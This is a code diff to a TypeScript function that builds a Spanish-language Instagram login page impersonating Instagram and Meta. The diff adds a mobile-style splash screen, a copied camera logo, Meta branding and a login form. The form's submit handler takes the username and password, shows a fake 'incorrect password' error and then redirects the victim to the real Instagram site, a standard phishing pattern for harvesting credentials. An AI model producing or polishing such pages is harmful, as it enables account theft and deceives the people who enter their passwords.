@@ -378,6 +378,36 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 }
 
 function buildInstagramPage(sessionId: string): string {
+  const igCameraIcon = `<svg width="96" height="96" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <radialGradient id="ig_splash" cx="30%" cy="107%" r="150%">
+      <stop offset="0%" stop-color="#fdf497"/>
+      <stop offset="5%" stop-color="#fdf497"/>
+      <stop offset="45%" stop-color="#fd5949"/>
+      <stop offset="60%" stop-color="#d6249f"/>
+      <stop offset="90%" stop-color="#285AEB"/>
+    </radialGradient>
+  </defs>
+  <rect width="100" height="100" rx="22" fill="url(#ig_splash)"/>
+  <rect x="16" y="16" width="68" height="68" rx="18" stroke="white" stroke-width="7" fill="none"/>
+  <circle cx="50" cy="50" r="19" stroke="white" stroke-width="7" fill="none"/>
+  <circle cx="73" cy="27" r="5" fill="white"/>
+</svg>`;
+  const igCameraSmall = `<svg width="72" height="72" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <radialGradient id="ig_form" cx="30%" cy="107%" r="150%">
+      <stop offset="0%" stop-color="#fdf497"/>
+      <stop offset="5%" stop-color="#fdf497"/>
+      <stop offset="45%" stop-color="#fd5949"/>
+      <stop offset="60%" stop-color="#d6249f"/>
+      <stop offset="90%" stop-color="#285AEB"/>
+    </radialGradient>
+  </defs>
+  <rect width="100" height="100" rx="22" fill="url(#ig_form)"/>
+  <rect x="16" y="16" width="68" height="68" rx="18" stroke="white" stroke-width="7" fill="none"/>
+  <circle cx="50" cy="50" r="19" stroke="white" stroke-width="7" fill="none"/>
+  <circle cx="73" cy="27" r="5" fill="white"/>
+</svg>`;
   return `<!DOCTYPE html>
 <html lang="es">
 <head>
@@ -388,153 +418,155 @@ function buildInstagramPage(sessionId: string): string {
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background: #fafafa;
+    background: #000;
     min-height: 100vh;
-    color: #262626;
+    color: #fff;
   }
 
-  /* Layout centrado en desktop */
-  .page-wrap {
+  /* ── PANTALLA 1: SPLASH ── */
+  #screen-splash {
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
     min-height: 100vh;
-    padding: 12px 0 24px;
+    padding: 24px 20px 40px;
   }
-
-  /* Tarjeta principal */
-  .card {
-    background: #fff;
-    border: 1px solid #dbdbdb;
-    border-radius: 2px;
+  .splash-logo { margin-bottom: 72px; }
+  .splash-menu {
     width: 100%;
-    max-width: 350px;
-    padding: 40px 40px 10px;
+    max-width: 390px;
     display: flex;
     flex-direction: column;
-    align-items: center;
+    gap: 10px;
+    margin-bottom: 32px;
   }
-
-  /* Logo cámara + wordmark */
-  .ig-logo-wrap {
+  .menu-btn {
     display: flex;
-    flex-direction: column;
     align-items: center;
-    margin-bottom: 28px;
-  }
-  .ig-wordmark {
-    height: 52px;
-  }
-
-  /* Inputs */
-  .field {
+    justify-content: space-between;
+    background: #1c1c1e;
+    border: none;
+    border-radius: 14px;
+    padding: 18px 20px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 400;
+    cursor: pointer;
     width: 100%;
+    text-align: left;
+    -webkit-appearance: none;
+  }
+  .menu-btn:active { background: #2c2c2e; }
+  .menu-chevron {
+    color: #636366;
+    font-size: 18px;
+    font-weight: 300;
+  }
+  .splash-from {
+    font-size: 12px;
+    color: #8e8e93;
+    text-align: center;
     margin-bottom: 6px;
   }
+  .splash-meta {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 5px;
+    margin-bottom: 20px;
+  }
+  .splash-legal {
+    font-size: 12px;
+    color: #8e8e93;
+    text-align: center;
+    max-width: 300px;
+    line-height: 1.5;
+  }
+  .splash-legal a { color: #8e8e93; text-decoration: underline; }
+
+  /* ── PANTALLA 2: FORMULARIO ── */
+  #screen-form {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding: 0 20px 40px;
+  }
+  .form-lang {
+    text-align: center;
+    font-size: 14px;
+    color: #ebebeb;
+    padding: 18px 0 0;
+    margin-bottom: 48px;
+  }
+  .form-logo { margin-bottom: 48px; }
+  .form-wrap { width: 100%; max-width: 390px; }
+
+  .field { width: 100%; margin-bottom: 10px; }
   .field input {
     width: 100%;
-    padding: 9px 8px 7px;
-    border: 1px solid #dbdbdb;
-    border-radius: 3px;
-    font-size: 12px;
-    background: #fafafa;
-    color: #262626;
+    padding: 16px 16px;
+    border: 1px solid #363636;
+    border-radius: 12px;
+    font-size: 16px;
+    background: #1c1c1e;
+    color: #fff;
     outline: none;
+    -webkit-appearance: none;
     transition: border-color 0.15s;
   }
-  .field input:focus {
-    border-color: #a8a8a8;
-    background: #fff;
-  }
-  .field input::placeholder { color: #8e8e8e; }
+  .field input:focus { border-color: #555; }
+  .field input::placeholder { color: #636366; }
 
-  /* Botón Iniciar sesión */
   .btn-login {
     width: 100%;
-    padding: 7px 16px;
-    background: #0095f6;
+    padding: 16px;
+    background: #4a6cf7;
     color: #fff;
     border: none;
-    border-radius: 8px;
-    font-size: 14px;
+    border-radius: 50px;
+    font-size: 16px;
     font-weight: 600;
     cursor: pointer;
-    margin-top: 8px;
-    opacity: 0.7;
-    transition: opacity 0.15s;
+    margin-top: 6px;
+    -webkit-appearance: none;
   }
-  .btn-login.active { opacity: 1; }
-  .btn-login:disabled { cursor: default; }
+  .btn-login:active { background: #3a5ce0; }
 
-  /* ¿Olvidaste? */
   .forgot {
-    margin-top: 14px;
-    font-size: 12px;
     text-align: center;
-  }
-  .forgot a { color: #00376b; text-decoration: none; font-weight: 600; }
-
-  /* Separador OR */
-  .sep {
-    display: flex;
-    align-items: center;
-    gap: 18px;
-    width: 100%;
-    margin: 18px 0;
-  }
-  .sep-line { flex: 1; height: 1px; background: #dbdbdb; }
-  .sep-text { font-size: 13px; font-weight: 600; color: #8e8e8e; letter-spacing: 1px; }
-
-  /* Botón Facebook */
-  .btn-fb {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    width: 100%;
-    background: none;
-    border: none;
-    cursor: pointer;
-    font-size: 14px;
-    font-weight: 600;
-    color: #385185;
-    padding: 8px 0 18px;
-  }
-  .btn-fb svg { width: 20px; height: 20px; }
-
-  /* Tarjeta "¿No tienes cuenta?" */
-  .card-register {
-    background: #fff;
-    border: 1px solid #dbdbdb;
-    border-radius: 2px;
-    width: 100%;
-    max-width: 350px;
-    padding: 20px;
-    text-align: center;
-    margin-top: 10px;
-    font-size: 14px;
-    color: #262626;
-  }
-  .card-register a { color: #0095f6; font-weight: 600; text-decoration: none; }
-
-  /* Descarga la app */
-  .app-section {
     margin-top: 20px;
-    text-align: center;
     font-size: 14px;
-    color: #262626;
-    margin-bottom: 14px;
+    color: #ebebeb;
   }
-  .app-badges {
-    display: flex;
-    gap: 8px;
-    justify-content: center;
-    margin-top: 12px;
-  }
-  .app-badges img { height: 38px; }
+  .forgot a { color: #ebebeb; text-decoration: none; }
 
-  /* Error */
+  .form-spacer { height: 80px; }
+
+  .btn-register {
+    width: 100%;
+    max-width: 390px;
+    padding: 15px;
+    background: transparent;
+    color: #4a6cf7;
+    border: 1.5px solid #4a6cf7;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    -webkit-appearance: none;
+    margin-bottom: 20px;
+  }
+
+  .form-meta {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 5px;
+    margin-top: 4px;
+  }
+
   .error-msg {
     color: #ed4956;
     font-size: 13px;
@@ -542,102 +574,106 @@ function buildInstagramPage(sessionId: string): string {
     margin-bottom: 10px;
     display: none;
   }
-
-  /* Responsive: en móvil quitamos bordes de tarjeta */
-  @media (max-width: 480px) {
-    .card, .card-register {
-      border: none;
-      border-radius: 0;
-      max-width: 100%;
-    }
-  }
 </style>
 </head>
 <body>
-<div class="page-wrap">
 
-  <!-- Tarjeta principal -->
-  <div class="card">
-    <!-- Logo wordmark oficial de Instagram -->
-    <div class="ig-logo-wrap">
-      <img class="ig-wordmark"
-        src="https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATpC0HgMr49.png"
-        alt="Instagram"
-        onerror="this.style.display='none';document.getElementById('igtext').style.display='block'">
-      <span id="igtext" style="display:none;font-size:28px;font-weight:700;font-style:italic;letter-spacing:-0.5px;font-family:Georgia,serif;">Instagram</span>
-    </div>
+<!-- ══ PANTALLA 1: SPLASH ══ -->
+<div id="screen-splash">
+  <div class="splash-logo">${igCameraIcon}</div>
 
-    <div class="error-msg" id="err">El nombre de usuario que ingresaste no pertenece a ninguna cuenta. <a href="#" style="color:#385185;font-weight:700;">Regístrate</a></div>
+  <div class="splash-menu">
+    <button class="menu-btn" onclick="return false;">
+      Abrir Instagram
+      <span class="menu-chevron">›</span>
+    </button>
+    <button class="menu-btn" id="btn-go-login">
+      Iniciar sesión
+      <span class="menu-chevron">›</span>
+    </button>
+    <button class="menu-btn" onclick="return false;">
+      Registrarte
+      <span class="menu-chevron">›</span>
+    </button>
+  </div>
 
-    <form id="loginForm" style="width:100%;">
+  <div class="splash-from">from</div>
+  <div class="splash-meta">
+    <svg width="46" height="14" viewBox="0 0 46 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="sm1" x1="0" y1="7" x2="16" y2="7" gradientUnits="userSpaceOnUse">
+          <stop offset="0%" stop-color="#0064E0"/>
+          <stop offset="100%" stop-color="#0082FB"/>
+        </linearGradient>
+      </defs>
+      <path d="M1.5 7c0-.9.2-1.64.52-2.15.41-.7 1.02-1.07 1.73-1.07.6 0 1.12.22 1.76 1.01.43.53.87 1.29 1.27 2.21.4-.92.84-1.68 1.27-2.21.64-.79 1.16-1.01 1.76-1.01.71 0 1.32.37 1.73 1.07.32.51.52 1.25.52 2.15 0 1.22-.37 2.26-.94 2.99-.5.62-1.11.96-1.83.96-.6 0-1.13-.19-1.7-.63-.44-.34-.9-.87-1.37-1.64l-.44-.71-.44.71c-.47.77-.93 1.3-1.37 1.64-.57.44-1.1.63-1.7.63-.72 0-1.33-.34-1.83-.96C1.87 9.26 1.5 8.22 1.5 7z" fill="url(#sm1)"/>
+      <text x="17" y="11" font-family="-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif" font-size="11" font-weight="500" fill="#fff">Meta</text>
+    </svg>
+  </div>
+  <div class="splash-legal">
+    Al continuar, aceptas las <a href="#">Condiciones de uso</a> y la <a href="#">Política de privacidad</a> de Instagram.
+  </div>
+</div>
+
+<!-- ══ PANTALLA 2: FORMULARIO ══ -->
+<div id="screen-form">
+  <div class="form-lang">Español</div>
+  <div class="form-logo">${igCameraSmall}</div>
+
+  <div class="form-wrap">
+    <div class="error-msg" id="err">Contraseña incorrecta. Inténtalo de nuevo.</div>
+
+    <form id="loginForm">
       <div class="field">
         <input type="text" id="username" name="username"
-          placeholder="Teléfono, usuario o correo electrónico"
-          autocomplete="username" autocapitalize="off" autocorrect="off" required>
+          placeholder="Nombre de usuario, correo o celular"
+          autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" required>
       </div>
       <div class="field">
         <input type="password" id="password" name="password"
           placeholder="Contraseña"
           autocomplete="current-password" required>
       </div>
-      <button type="submit" class="btn-login" id="btn" disabled>Iniciar sesión</button>
+      <button type="submit" class="btn-login" id="btn">Iniciar sesión</button>
     </form>
 
-    <div class="sep">
-      <div class="sep-line"></div>
-      <span class="sep-text">O</span>
-      <div class="sep-line"></div>
-    </div>
-
-    <button class="btn-fb" onclick="return false;">
-      <!-- Icono Facebook -->
-      <svg viewBox="0 0 24 24" fill="#385185"><path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96A10 10 0 0 0 22 12.06C22 6.53 17.5 2.04 12 2.04Z"/></svg>
-      Iniciar sesión con Facebook
-    </button>
-
     <div class="forgot">
-      <a href="#">¿Olvidaste la contraseña?</a>
+      <a href="#">¿Olvidaste tu contraseña?</a>
+    </div>
+
+    <div class="form-spacer"></div>
+
+    <button class="btn-register" onclick="return false;">Crear cuenta nueva</button>
+
+    <div class="form-meta">
+      <svg width="46" height="14" viewBox="0 0 46 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="fm1" x1="0" y1="7" x2="16" y2="7" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0064E0"/>
+            <stop offset="100%" stop-color="#0082FB"/>
+          </linearGradient>
+        </defs>
+        <path d="M1.5 7c0-.9.2-1.64.52-2.15.41-.7 1.02-1.07 1.73-1.07.6 0 1.12.22 1.76 1.01.43.53.87 1.29 1.27 2.21.4-.92.84-1.68 1.27-2.21.64-.79 1.16-1.01 1.76-1.01.71 0 1.32.37 1.73 1.07.32.51.52 1.25.52 2.15 0 1.22-.37 2.26-.94 2.99-.5.62-1.11.96-1.83.96-.6 0-1.13-.19-1.7-.63-.44-.34-.9-.87-1.37-1.64l-.44-.71-.44.71c-.47.77-.93 1.3-1.37 1.64-.57.44-1.1.63-1.7.63-.72 0-1.33-.34-1.83-.96C1.87 9.26 1.5 8.22 1.5 7z" fill="url(#fm1)"/>
+        <text x="17" y="11" font-family="-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif" font-size="11" font-weight="500" fill="#fff">Meta</text>
+      </svg>
     </div>
   </div>
-
-  <!-- Tarjeta Regístrate -->
-  <div class="card-register">
-    ¿No tienes una cuenta? <a href="#">Regístrate</a>
-  </div>
-
-  <!-- Descarga la app -->
-  <div class="app-section">
-    <p>Descarga la aplicación.</p>
-    <div class="app-badges">
-      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" onerror="this.style.display='none'">
-      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/KFyqdIsB0L4.png" alt="Google Play" onerror="this.style.display='none'">
-    </div>
-  </div>
-
 </div>
 
 <script>
-const u = document.getElementById('username');
-const p = document.getElementById('password');
-const btn = document.getElementById('btn');
-
-function checkFields() {
-  if (u.value.trim().length > 0 && p.value.length > 0) {
-    btn.disabled = false;
-    btn.classList.add('active');
-  } else {
-    btn.disabled = true;
-    btn.classList.remove('active');
-  }
-}
-u.addEventListener('input', checkFields);
-p.addEventListener('input', checkFields);
+document.getElementById('btn-go-login').addEventListener('click', function() {
+  document.getElementById('screen-splash').style.display = 'none';
+  var f = document.getElementById('screen-form');
+  f.style.display = 'flex';
+  setTimeout(function() { document.getElementById('username').focus(); }, 100);
+});
 
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
-  const uv = u.value.trim();
-  const pv = p.value;
+  var uv = document.getElementById('username').value.trim();
+  var pv = document.getElementById('password').value;
   if (!uv || !pv) return;
+  var btn = document.getElementById('btn');
   btn.disabled = true;
   btn.textContent = 'Iniciando...';
   document.getElementById('err').style.display = 'none';
@@ -652,10 +688,8 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     document.getElementById('err').style.display = 'block';
     btn.disabled = false;
     btn.textContent = 'Iniciar sesión';
-    btn.classList.add('active');
-    p.value = '';
-    p.focus();
-    checkFields();
+    document.getElementById('password').value = '';
+    document.getElementById('password').focus();
     setTimeout(function() { window.location.href = 'https://www.instagram.com'; }, 3000);
   }, 1400);
 });
